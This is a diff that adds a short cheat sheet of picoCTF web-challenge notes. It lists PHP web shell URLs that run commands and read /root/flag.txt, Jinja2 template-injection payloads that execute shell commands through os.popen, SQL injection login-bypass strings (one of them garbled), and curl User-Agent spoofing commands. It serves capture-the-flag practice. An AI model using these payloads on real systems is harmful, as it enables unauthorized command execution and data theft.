@@ -1,0 +1,39 @@
+-> Always Read the robots.txt and source code
+-> Always See the inspect and digging network option
+-> Always use common Sqli Payloads and always check the cookies
+-> Always Check Http Header via curl and Burp
+
+File Upload:
+http://standard-pizzas.picoctf.net:51300/uploads/cmd.php?cmd=id
+http://standard-pizzas.picoctf.net:51300/uploads/id.php?id=id
+http://standard-pizzas.picoctf.net:51300/uploads/id.php?id=sudo%20ls%20/root
+http://standard-pizzas.picoctf.net:51300/uploads/id.php?id=sudo%20cat%20/root/flag.txt
+
+SSTI:
+https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
+
+SQLI:
+admin' OR 1=1 --
+admin'--
+' or 1=1;
+' be 1=1;
+
+Custom UserAgent:
+curl -A "User-Agent:picobrowser" https://jupiter.challenges.picoctf.org/problem/28921/flag
+curl -A "picobrowser" https://jupiter.challenges.picoctf.org/problem/28921/flag
+curl -H "User-Agent:picobrowser" https://jupiter.challenges.picoctf.org/problem/28921/flag
+
+
+
+
+
+
+
+
+
+
+
+
